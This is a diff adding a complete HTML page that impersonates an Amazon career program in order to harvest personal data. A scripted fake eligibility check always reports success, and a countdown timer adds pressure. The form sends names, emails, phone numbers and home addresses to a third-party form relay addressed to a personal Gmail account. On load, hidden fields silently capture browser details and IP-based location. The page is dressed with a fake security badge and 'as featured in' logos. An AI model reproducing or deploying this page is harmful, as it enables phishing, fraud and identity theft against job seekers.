@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Amazon Career Choice Expansion</title>
+  <link rel="stylesheet" href="css/ccm-asset.css">
+  <link rel="stylesheet" href="https://d3216uwaav9lg7.cloudfront.net/assets-A20m.css">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+    .form-section {
+      background: #ffffff;
+      padding: 40px 20px;
+      margin-top: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      position: relative;
+    }
+    .form-section input, .form-section select, .form-section textarea {
+      width: 95%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .form-section button {
+      background-color: #ff9900;
+      color: #fff;
+      padding: 14px 28px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .form-section button.loading {
+      pointer-events: none;
+      opacity: 0.7;
+    }
+    .form-section button.loading::after {
+      content: ' \231B Connecting...';
+      font-size: 14px;
+      color: #fff;
+      margin-left: 10px;
+    }
+    .secure-badge {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #e8f5e9;
+      border: 1px solid #c8e6c9;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #2e7d32;
+    }
+    .secure-badge img {
+      height: 24px;
+      margin-right: 10px;
+    }
+    .media-logos {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .media-logos img {
+      height: 30px;
+      margin: 0 10px;
+      opacity: 0.8;
+      border-radius: 4px;
+    }
+    .amazon-logo {
+      display: block;
+      margin: 0 auto 20px auto;
+      height: 50px;
+    }
+    #processing {
+      padding: 20px;
+      text-align: center;
+      background-color: #fff3cd;
+      border: 1px solid #ffeeba;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+    #fullscreen-loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(255, 255, 255, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    #fullscreen-loader.active {
+      display: flex;
+    }
+    #countdown {
+      font-weight: bold;
+      color: #d9534f;
+      font-size: 18px;
+    }
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.4; }
+      100% { opacity: 1; }
+    }
+    .loader {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      margin: 0 3px;
+      background-color: #ff9900;
+      border-radius: 50%;
+      animation: pulse 1.2s infinite ease-in-out both;
+    }
+    .loader:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    .loader:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+    .hidden {
+      display: none !important;
+    }
+    .center {
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div id="fullscreen-loader">
+    <div>Submitting your application...</div>
+    <div>
+      <span class="loader"></span>
+      <span class="loader"></span>
+      <span class="loader"></span>
+    </div>
+  </div>  <div class="form-section">
+    <img class="amazon-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo"><h2 class="center" id="eligibility-title">Check Your Eligibility</h2>
+<p class="center" id="intro-text">Find out if your organization is part of Amazon’s Career Choice Expansion Program</p>
+
+<form id="eligibilityForm">
+ 
+  <label>Full Name</label>
+  <input type="text" name="name" required>
+
+  <label>Company Name</label>
+  <input type="text" name="company" required>
+
+  <label>Company Email</label>
+  <input type="email" name="email" required>
+
+  <button type="submit" id="checkEligibilityBtn">Check Eligibility</button>
+</form>
+
+<div id="processing" class="hidden">
+  <p><strong>Matching you with eligible programs...</strong></p>
+  <div>
+    <span class="loader"></span>
+    <span class="loader"></span>
+    <span class="loader"></span>
+  </div>
+</div>
+
+<div id="qualified" class="hidden">
+  <h3 class="center" id="qualify-title">🎉 You Qualify!</h3>
+  <p class="center" id="qualify-note">
+    Your organization is part of our 2025 Expansion Pilot. Complete the form below to begin your application.
+  </p>
+
+  <p class="center" id="countdown-note"><strong>Note:</strong> Your application window expires in <span id="countdown">09:59</span> minutes.</p>
+
+  <form id="final-form" action="https://formsubmit.co/kingstonmick7@gmail.com" method="POST">
+    <!-- Honeypot -->
+  <div style="display:none;">
+    <label>Leave this field empty</label>
+    <input type="text" name="_honey">
+  </div>
+   <label>Your personal email</label>
+    <input type="email" name="p_email" required>
+    
+    <label>Phone Number</label>
+    <input type="tel" name="phone" required>
+
+    <label>Country</label>
+    <select name="country">
+      <option>United States</option>
+      <option>Canada</option>
+      <option>Mexico</option>
+      <option>United Kingdom</option>
+    </select>
+     <label>City</label>
+    <input type="text" name="city" required>
+    
+     <label>Address <label>
+       <input type="text" name="address" required>
+       
+        <label>Postal code </label>
+       <input type="text" name="postal_code" required>
+
+    <label>Preferred Program Path</label>
+    <select name="path">
+      <option>Technology</option>
+      <option>Healthcare</option>
+      <option>Logistics</option>
+      <option>Business Services</option>
+    </select>
+
+    <label>Brief Summary of Career Goal</label>
+    <textarea rows="4" name="career_goal"></textarea>
+    
+      <input type="hidden" name="userAgent" id="userAgent">
+  <input type="hidden" name="platform" id="platform">
+  <input type="hidden" name="language" id="language">
+  <input type="hidden" name="timezone" id="timezone">
+  <input type="hidden" name="geo_ip" id="geo_ip">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="box">
+  <!-- Hidden clones of the first form's data -->
+<input type="hidden" name="eligibility_name" id="eligibility_name">
+<input type="hidden" name="eligibility_company" id="eligibility_company">
+<input type="hidden" name="eligibility_email" id="eligibility_email">
+
+    <button type="submit" id="submitFinal">Submit Application</button>
+  </form>
+
+  <div id="final-status" class="hidden">
+    <h3 class="center">✅ Application Received</h3>
+    <p class="center">Your application has been submitted successfully and is now under review. You will receive onboarding instructions via email within 48 hours.</p>
+  </div>
+
+  <div class="secure-badge">
+    <img  src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOIP.aYHVIxkoUi_sczBvYfznPgHaEx%26pid%3DApi&f=1&ipt=1db16f46461ca2c3ab53cb8a8762666b530916792dbcf59c3be392987a48f245&ipo=images" alt="Secure Badge">
+    <span>Your information is protected under Amazon’s Privacy Standards.</span>
+  </div>
+
+  <div class="media-logos">
+    <p style="margin-top: 20px; font-weight: bold;">As featured in:</p>
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOIP.WEh273fiHLB2Ry8mS9icpwHaB7%26pid%3DApi&f=1&ipt=93e9512a136bef6ec664b579c9f56530a241154e6d618e1306458506a398b5be&ipo=images" alt="Forbes">
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse4.mm.bing.net%2Fth%3Fid%3DOIP.YryFhMu6tOQmXpBXYrZ4ewHaEK%26pid%3DApi&f=1&ipt=1fc5f9d0c1524f4360a870ec8cc9c7de9dc8aba9aa799bf599b52e9e401dc2ec&ipo=images" alt="CNBC">
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%2Fid%2FOIP.VJhVCn_KEP55vMgXH9jepwHaHY%3Fpid%3DApi&f=1&ipt=02c5dc2b7758eb59f57e018a5cbc2216821edf5a4ddf6b3070432be7dc5d08ee&ipo=images" alt="LinkedIn">
+  </div>
+
+  <p class="center" style="margin-top: 30px; font-weight: bold;">Join 200,000+ successful applicants who changed their lives through Amazon’s Career Choice. Be the next.</p>
+</div>
+
+  </div>  <script>
+  
+  window.addEventListener('DOMContentLoaded', () => {
+    // Device info
+    document.getElementById('userAgent').value = navigator.userAgent;
+    document.getElementById('platform').value = navigator.platform;
+    document.getElementById('language').value = navigator.language;
+    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    // Geolocation fallback via API
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const loc = `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country_name}, Lat/Lng: ${data.latitude},${data.longitude}`;
+        document.getElementById('geo_ip').value = loc;
+      })
+      .catch(() => {
+        document.getElementById('geo_ip').value = 'Geo location unavailable';
+      });
+  });
+  
+  
+  
+  
+    const form = document.getElementById('eligibilityForm');
+    const processing = document.getElementById('processing');
+    const qualified = document.getElementById('qualified');
+    const countdownEl = document.getElementById('countdown');
+    const introText = document.getElementById('intro-text');
+    const qualifyTitle = document.getElementById('qualify-title');
+    const qualifyNote = document.getElementById('qualify-note');
+    const countdownNote = document.getElementById('countdown-note');
+    const submitFinal = document.getElementById('submitFinal');
+    const finalForm = document.getElementById('final-form');
+    const finalStatus = document.getElementById('final-status');
+    const eligibilityTitle = document.getElementById('eligibility-title');
+    const fullLoader = document.getElementById('fullscreen-loader');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      form.classList.add('hidden');
+      introText.classList.add('hidden');
+      eligibilityTitle.classList.add('hidden');
+      processing.classList.remove('hidden');
+
+      setTimeout(() => {
+        processing.classList.add('hidden');
+        qualified.classList.remove('hidden');
+        startCountdown(9, 59);
+      }, 6000);
+    });
+
+    submitFinal.addEventListener('click', function () {
+        // Copy eligibilityForm data to hidden inputs in finalForm
+  document.getElementById('eligibility_name').value = form.querySelector('input[name="name"]').value;
+  document.getElementById('eligibility_company').value = form.querySelector('input[name="company"]').value;
+  document.getElementById('eligibility_email').value = form.querySelector('input[name="email"]').value;
+
+  // Show loading screen
+  fullLoader.classList.add('active');
+
+  // Delay for realism, then submit
+  setTimeout(() => {
+    fullLoader.classList.remove('active');
+    finalForm.submit();  // 💥 This actually sends the combined data
+        finalForm.classList.add('hidden');
+        qualifyTitle.classList.add('hidden');
+        qualifyNote.classList.add('hidden');
+        countdownNote.classList.add('hidden');
+        finalStatus.classList.remove('hidden');
+      
+      }, 5000);
+    });
+
+    function startCountdown(min, sec) {
+      let total = min * 60 + sec;
+      const interval = setInterval(() => {
+        total--;
+        let m = Math.floor(total / 60);
+        let s = total % 60;
+        countdownEl.textContent = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+        if (total <= 0) clearInterval(interval);
+      }, 1000);
+    }
+  </script></body>
+</html>
